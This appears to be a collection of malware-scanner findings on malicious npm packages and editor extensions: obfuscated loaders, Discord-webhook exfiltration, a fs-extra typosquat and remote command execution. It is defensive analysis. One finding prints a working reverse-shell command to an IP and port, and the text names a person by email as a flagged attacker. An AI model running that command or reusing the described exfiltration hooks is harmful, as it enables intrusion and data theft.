The file contains clearly malicious, obfuscated runtime code appended to a legitimate ESLint config. Indicators of intent: it reassigns core objects to globals (global['r']=require; global['m']=module), contains dense string-obfuscation/decoding routines (YWG, large scrambled strings and a decode/invoke sequence), and ultimately calls a decoded function (XZs(7942)) — i.e., dynamic code execution at module load. These are deliberate evasion/loader patterns (long whitespace padding, base64-like data, redefined require) consistent with a backdoor or supply‑chain malware rather than benign code.

A legitimate routing module is followed by clearly malicious, heavily obfuscated code that is executed immediately. The payload performs string mangling/concatenation, rewrites global identifiers (including assigning a global entry to require), and calls a decoded function at load time. Those signs — reuse/reassignment of require, long whitespace/garbage, base64-like/obfuscated strings, and immediate execution — indicate deliberate obfuscation and a likely backdoor or injection, so this is malicious code.
Triggers high-precision YARA match to known malicious patterns, suggesting high confidence malware detection.
The author venjamin (decovenjamin@gmail.com) has been flagged as a known malicious actor.

The module deliberately invokes node:child_process.exec to run 'sh -i >& /dev/tcp/10.0.26.109/4444 0>&1', which is a classic reverse shell opening an interactive shell to a remote IP/port. The combination of dynamic command execution and the hardcoded attacker IP/port indicates clear malicious/backdoor intent.

The script reads a sensitive file (/usr/src/app/flag) then sends its contents to an external tunnel hostname over plain HTTP, suppresses errors, and delays execution—behavior consistent with deliberate data exfiltration. This is clear malicious intent rather than benign utility.

The code deliberately exfiltrates data: it defines x9z that base64-encodes the supplied data, chunks it (1900-byte slices), and POSTs JSON payloads via Node's https.request to a decoded hostname/path — base64 decodes to "discord.com" and "/api/webhooks/WEBHOOK_ID" (a Discord webhook). The module then monkey-patches exports.writeFile to call x9z(data) asynchronously on every write. Obfuscation (base64 strings, short names), silent try/catch, and hooking a core filesystem API indicate intentional, covert data exfiltration — clear malicious behavior (supply-chain/backdoor).

The module hijacks jsonfile's read/write APIs and, on every read or write, calls y8x(...) which base64-encodes the JSON data, chunks it, and POSTs it to a remote Discord webhook (hostname 'discord.com', path '/api/webhooks/WEBHOOK_ID'). This is silent data exfiltration (hidden in try/catch, uses chunking and background nextTick), which is deliberate malicious behavior rather than benign instrumentation.

The README is a verbatim copy of the legitimate "fs-extra" project but the package name is "fsextrra" (name mismatch/typosquat). Badges and links point to the real fs-extra repo/npm while the package name differs — strong evidence of deliberate impersonation to trick users into installing the wrong package (supply‑chain/typosquatting malicious behavior). No code is present, but the intent and context indicate deceptive/malicious packaging rather than a benign project.

The extension fetches remote JSON and hex-decodes a string into a shell command which it runs with child_process.exec without validation. That is remote arbitrary command execution (RCE) — a clear deliberate malicious capability (remote payload execution / potential exfiltration), not benign behavior for an editor extension.

The extension fetches JSON from a remote host (api.cursor-extension.help), collects platform/arch (fingerprinting), then decodes a hex string from the response into a shell command and calls child_process.exec on it with no validation. Remote-supplied, dynamically-decoded commands executed locally constitute deliberate arbitrary remote code execution/command injection — clearly malicious.
